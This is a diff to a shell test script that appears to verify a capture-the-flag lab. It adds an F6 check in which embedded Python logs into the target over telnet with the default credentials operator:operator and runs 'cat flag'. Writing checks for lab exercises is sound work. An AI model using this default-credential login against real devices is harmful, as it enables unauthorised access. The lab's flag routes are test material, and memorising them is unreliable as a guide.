@@ -67,6 +67,43 @@ else
 	echo "SKIP F5 flag after the knock sequence (run from another machine)"
 fi
 
+# --- F6: telnet with factory credentials
+telnet_flag() {
+	python3 - "$T" <<'PY'
+import socket, sys, time
+
+s = socket.create_connection((sys.argv[1], 23), timeout=5)
+s.settimeout(1.5)
+out = b""
+
+
+def drain():
+	global out
+	try:
+		while True:
+			chunk = s.recv(4096)
+			if not chunk:
+				break
+			out += chunk
+	except socket.timeout:
+		pass
+
+
+drain()
+for line in ("operator", "operator", "cat flag"):
+	s.sendall(line.encode() + b"\r\n")
+	time.sleep(0.4)
+	drain()
+try:
+	s.sendall(b"exit\r\n")
+except OSError:
+	pass
+s.close()
+sys.exit(0 if "ISC{" in out.decode(errors="replace") else 1)
+PY
+}
+check "F6 flag over telnet (operator:operator)" telnet_flag
+
 echo
 if (( fails )); then
 	echo "$fails test(s) FAILED"
